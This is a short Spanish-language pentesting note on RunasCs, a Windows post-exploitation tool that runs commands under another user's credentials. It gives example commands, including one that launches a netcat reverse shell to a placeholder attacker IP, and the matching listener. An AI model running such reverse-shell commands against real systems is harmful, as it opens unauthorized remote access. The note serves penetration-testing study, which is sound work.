# RunasCs

Tags: #Windows #RunasCs #PrivEsc 

RunasCs es una herramienta de postexplotación para Windows que permite ejecutar programas como otro usuario utilizando sus credenciales, mediante mecanismos relacionados con `CreateProcessWithLogonW` sin necesitar una sesión interactiva. Es el equivalente a `runas` pero funciona sobre WinRM/shells no interactivas.

En pentesting, se utiliza principalmente para comprobar si puedes ejecutar procesos con la identidad de otra cuenta cuando ya tienes acceso a un equipo.

* [RunasCs](https://github.com/antonioCoco/RunasCs)

```powershell 
# Ejecutar un comando como otro usuario 
❯ .\RunasCs.exe user "P@$$w0rd123!" "whoami"
❯ .\RunasCs.exe user "P@$$w0rd123!" "whoami" -d domain.local

	# user = Usuario a cambiar de sesión   
```

```powershell 
# Ejecutar una revershell 
❯ .\RunasCs.exe user P@$$w0rd123! "cmd.exe /c C:\Temp\nc64.exe IP_kali 4444 -e cmd.exe"

# Recibir la revershell en Kali 
❯ nc -lvnp 4444
```